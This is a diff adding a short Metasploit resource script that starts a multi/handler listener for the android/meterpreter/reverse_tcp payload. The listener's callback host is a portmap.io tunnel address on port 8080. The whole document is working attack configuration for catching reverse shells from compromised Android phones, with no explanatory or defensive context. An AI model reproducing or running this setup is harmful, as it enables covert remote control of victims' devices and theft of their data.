@@ -1,0 +1,6 @@
+use multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST  SLDragon-59337.portmap.io
+set LPORT  8080
+set ExitOnSession true
+run
